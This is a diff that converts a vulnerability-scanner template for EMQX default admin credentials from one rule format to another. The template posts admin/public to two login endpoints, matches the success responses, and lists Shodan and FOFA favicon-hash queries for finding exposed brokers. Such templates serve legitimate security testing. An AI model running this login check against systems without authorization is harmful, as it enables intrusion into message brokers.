@@ -4,47 +4,38 @@ info:
   name: Emqx Default Admin Login
   author: For3stCo1d
   severity: high
-  description: Emqx default admin credentials were discovered.
-  classification:
-    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
-    cvss-score: 8.3
-    cwe-id: CWE-522
-  metadata:
-    max-request: 1
-    shodan-query: http.favicon.hash:"-670975485"
+  verifed: true
+  description: |-
+    Emqx default admin credentials were discovered.
+    shodan: http.favicon.hash:"-670975485"
+    fofa: icon_hash="-670975485"
   tags: emqx,default-login
+  created: 2023/06/24
 
-variables:
-  username: "admin"
-  password: "public"
-
-http:
-  - raw:
-      - |
-        POST {{path}} HTTP/1.1
-        Host: {{Hostname}}
+rules:
+  r0:
+    request:
+      method: POST
+      path: /api/v4/auth
+      headers:
         Content-Type: application/json
-
-        {"username":"{{username}}","password":"{{password}}"}
-
-    attack: clusterbomb
-    payloads:
-      path:
-        - "/api/v4/auth"
-        - "/api/v5/login"
-
-    matchers-condition: or
-    matchers:
-      - type: dsl
-        dsl:
-          - body == "{\"code\":0}"
-          - status_code == 200
-        condition: and
-
-      - type: dsl
-        dsl:
-          - contains(body, "\"token\":") && contains(body, "\"license\":")
-          - contains(content_type, 'application/json')
-          - status_code == 200
-        condition: and
-# digest: 490a0046304402200ff33809984d5fd3bef9ed1c67d285f303e8e0ca1f3dfefe932dfc848bf9389b02205ede1342037983eec078e752241c177cc71024dfb71070267f346f5f6cf80765:922c64590222798bb761d5b6d8e72950
+      body: |
+        {"username":"admin","password":"public"}
+    expression: |
+      response.status == 200 && 
+      response.body == bytes("{\"code\":0}")
+  r1:
+    request:
+      method: POST
+      path: /api/v5/login
+      headers:
+        Content-Type: application/json
+      body: |
+        {"username":"admin","password":"public"}
+    expression: |
+      response.status == 200 && 
+      response.content_type.contains("application/json") &&
+      response.body.bcontains(b'"token":') &&
+      response.body.bcontains(b'"license":') &&
+      response.body.bcontains(b'"version":')
+expression: r0() || r1()
